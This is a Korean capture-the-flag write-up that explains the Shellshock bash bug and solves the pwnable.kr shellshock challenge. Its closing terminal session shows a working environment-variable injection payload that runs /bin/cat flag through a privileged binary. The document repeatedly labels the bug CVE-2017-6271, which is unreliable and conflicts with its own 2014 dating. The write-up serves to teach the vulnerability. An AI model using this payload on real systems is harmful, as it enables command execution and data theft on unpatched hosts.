# Shellshock

### CVE-2017-6271

> 작성자 : f.killrra
>
> 작성일 : 2018-07-15

~$ what is shellshock?

> 이 취약점을 간단히 소개한다면 bash 쉘에서 원격 명령을 실행 할 수 있는 취약점입니다.

> 참고로 이 취약점은 지금은 패치가 되었고 bash 4.3 이하 버전에서 발생한다고 합니다.

영국 IT  매니저로 근무하는 프랑스인 스테판 챠젤라스는 bash의 소스 코드를 분석하던 중 원격 명령을 실행 할 수 있는 취약점을 2014년 9월 12일에 발견하여 bash 개발 담당자에게 신고하였습니다.

이 취약점이 존재하는 코드는 1993년도 이전부터 최근에 발견되기 전까지 20년 동안 존재했으며 OpenSSL 하트블리드 취약점에 이름을 짓는 유행에 따라 이 취약점의 이름을 쉘쇼크라고 짓게 되었습니다.

bash의 취약점을 이용한 공격인 만큼 bash에 대한 이해가 필요합니다.

> bash shell 은 유닉스, 리눅스, 맥 계열에서 주로 사용되는 프로그램 명령어로 컴퓨터 작업을 할 수 있는 환경을 제공하는 소프트웨어입니다.
>
> 예를 들어 윈도우는 마우스를 사용하여 그림으로 표현된 파일이나 폴더를 이용하지만 유닉스, 리눅스, 맥에서는 사용 용도에 따라 그래픽이 지원되지 않을 경우도 있고 효율성을 위해 명령으로만 파일을 실행하고 작업하기 좋은 환경으로 설계 되어있습니다.
>
> 이런 bash shell을 통해서 명령어를 사용하면 시스템 정보를 확인하거나 프로그램을 실행시키는 컴퓨터 작업, 권한 사용 등을 수행할 수 있습니다. 배쉬 셀에서 명령어가 입력되면 입력된 명령어를 해석하여 명령어에 맞는 작업 결과를 제공합니다.

![default](https://user-images.githubusercontent.com/40850499/42733381-83789310-886b-11e8-9710-9a1c77d8a970.PNG)

GNU bash 에서 발견된 쉘쇼크 취약점이 공개된 이후 큰 이슈가 되었고 이를 기반으로한 많은 취약점을 제공했는데 이 처럼 원격 명령 실행, 함수 선언문 파싱 에러, 잘못된 메모리 접근 등 여러가지 행위를 가능하게 했습니다.

저는 여기서 취약점의 기본이 되는 가장 위의 내용을 실습해보았습니다.

취약점이 발생한 부분은 Bash 쉘이 제공하는 함수 선언 기능인데요.

() 와 { 이것으로 시작하는 문자열을 시스템 환경 변수에 등록하면 동일한 이름을 가진 함수로 선언이 됩니다.

하지만 함수 선언문 끝에 임의의 명령어를 추가로 삽입할 경우, Bash가 함수문에서 처리를 멈추지 않고 추가로 삽입한 명령어를 계속 실행시키기 때문에 문제가 발생합니다.

![default](https://user-images.githubusercontent.com/40850499/42733392-a2239b34-886b-11e8-8830-aba75c71f1b2.PNG)

이것이 가능한 이유는 bash 의 소스코드를 분석해보면 알 수 있는데요.

evalstring.c 파일 내에 정의되어 있는 parse_and_execute() 함수에서 bash에 전달된 명령어를 처리하는 과정에서 반복문을 사용하는데, 함수 선언문 뒤에 명령어가 삽입된 것을 확인하고 반복문을 종료시키는 코드가 없기 때문에 가능합니다.

**이는 직접적으로 명령어 주입이 가능한 취약점이기 때문에 ASLR 등의 운영체제 보호 기법에 전혀 영향을 받지 않습니다.** 

`이 점에서 매우 구미가 땡기네요..`

![demo](https://user-images.githubusercontent.com/40850499/42733397-b0e8afc4-886b-11e8-82c6-37b7c9746dea.PNG)

[pwnable.kr](http://pwnable.kr) 의 문제 shellshock를 풀면서 취약점을 더 쉽게 이해할 수 있습니다.

> Mommy, there was a shocking news about bash.
>
> I bet you already know, but lets just make it sure :)
>
> ssh [shellshock@pwnable.kr](mailto:shellshock@pwnable.kr) -p2222 (pw:guest)

ssh접속하여 ls 명령어로 뭐가 들었는지 봅시다.

> shellshock@ubuntu:~$ ls
>
> bash  flag  shellshock    shellshock.c
>
> shellshock@ubuntu:~$ cat shellshock.c
>
> \#include <stdio.h>
>
> int main(){
>
> ​    setresuid(getegid(), getegid(), getegid());
>
> ​    setresgid(getegid(), getegid(), getegid());
>
> ​    system("/home/shellshock/bash -c 'echo shock_me'");
>
> ​    return 0;
>
> }
>
> shellshock@ubuntu:~$

cat 으로 shellshock.c 파일을 열어본 내용입니다.

소스코드를 분석해보면 getegid() 는 사용자의 ID를 반환하고, setresuid() 는 실제 프로세스의 유효 사용자 및 ID를 설정하는 함수이고, getegid() 를 통해 얻어온 사용자의 ID로 이 프로세스의 권한을 설정해주는 작업을 합니다.

setresgid() 또한 유효 gid를 설정해주는 함수로 shellshock으로 세팅을 해줍니다.

> shellshock@ubuntu:~$ id
>
> uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)

현재 uid, gid, groups 모두 shellshock이고 setuid 가 걸린 바이너리는 shellshock_pwn 의 권한을 갖습니다.

그리고 마지막으로 system() 를 호출하여 sub shell 인 bash 를 호출하여 echo shock_me를 출력하고, 프로세스가 종료됩니다.

이때 sub bash shell 이 실행되면서 환경변수의 내용을 그대로 복사해오게 되고 선언되었던 환경 변수의 함수를 사용하게 됩니다.

> shellshock@ubuntu:~$ export x='ABCD'
>
> shellshock@ubuntu:~$ x
>
> x: command not found
>
> shellshock@ubuntu:~$ x() { echo hacked by f.killrra; }
>
> shellshock@ubuntu:~$ export -f x
>
> shellshock@ubuntu:~$ export x='() { echo hacked by f.killrra; }; /bin/cat flag'
>
> shellshock@ubuntu:~$ ./shellshock
>
> ------------------flag------------------
>
> Segmentation fault
>
> shellshock@ubuntu:~$

이렇게 export x 하여 아무값이나 넣어주고, x 함수를 정의해준 뒤 -f 옵션(function option)을 주어 환경변수를 등록해 줍니다.

그 뒤 추가적으로 /bin/cat flag 라는 명령어를 삽입한뒤 shellshock 바이너리를 실행 시키면 flag 파일을 열어볼 수 있습니다. 

이상 shellshock (CVE-2017-6271)에 대한 정리를 마칩니다.

 